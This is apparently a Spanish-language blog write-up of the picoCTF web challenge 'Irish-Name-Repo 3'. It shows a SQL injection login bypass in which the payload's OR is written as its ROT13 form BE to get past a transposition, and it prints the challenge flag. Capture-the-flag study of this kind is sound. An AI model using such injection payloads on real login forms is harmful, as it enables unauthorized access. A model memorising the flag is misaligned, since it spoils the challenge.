---
title: Irish-Name-Repo 3
date: 2025-05-19 00:00:00 +0200
categories: [writeup, picoctf]
tags: [picoctf, irish-name-repo 3, explotación web]     
image:
    path: https://picoctf.org/img/logos/pico-mark.svg
    alt: PicoCTF
---

>Irish-Name-Repo 3
Author: Xingyang Pan
Description
There is a secure website running at https://jupiter.challenges.picoctf.org/problem/40742/ (link) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!
{: .prompt-tip }

Al abrir la web tenemos un botón que nos pedirá la password, si capturamos o en la propia consola ponemos atención al request veremos que
se están enviando la siguiente información:

password=admin&debug=0

Empiezo por probar lo más obvio, poner debug a 1. Cuando haces esto enseguida caes en la cuenta de que parece una inyección sql pero
con algunos matices. 



Primero de todo como podemos cambiar el orden de los parámetros para no liarlos
debug=1&password=adfasdf

Cuando hago la inyección 
>1234' OR  '1=1';
Nos aparece esto:
```
password=1234' BE  '1=1';
```

Empecé a jugar con los valores hasta darme cuenta que durante el debug estos valores estaban siendo alterados, 
OR aparece como BE. Así que imagine que podía establecer una relación y es bastante obvia, hay una transposición durante el debug.

>OPQR se transpone a BCDE

Pruebo con lo siguiente siguiendo la lógica anterior
debug=1&password=1234' BE  '1=1';

``` html
password: 1234' BE  '1=1';
SQL query: SELECT * FROM admin where password = '1234' OR  '1=1';'

Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
flag: **picoCTF{3v3n_m0r3_SQL_4424e7af}**

Otra inyección SQLi pero con una variación curiosa. 
